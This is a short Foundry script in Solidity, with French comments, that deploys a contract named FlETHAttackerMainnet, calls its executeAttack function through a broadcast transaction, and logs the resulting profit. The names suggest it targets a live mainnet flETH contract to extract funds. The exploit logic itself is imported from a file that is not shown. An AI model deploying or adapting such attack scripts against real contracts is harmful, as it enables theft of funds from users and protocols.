// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/FlETHAttackerMainnet_Strategy_to_flETH.sol";

contract DeployAndAttack3 is Script {
    function run() external {
        vm.startBroadcast();

        // Déployer le contrat
        FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
        console.log("Contract deployed at:", address(attacker));

        // Exécuter l'attaque
        attacker.executeAttack();
        console.log("Attack executed!");

        // Vérifier les résultats
        console.log("Profit:", attacker.profit());

        vm.stopBroadcast();
    }
}
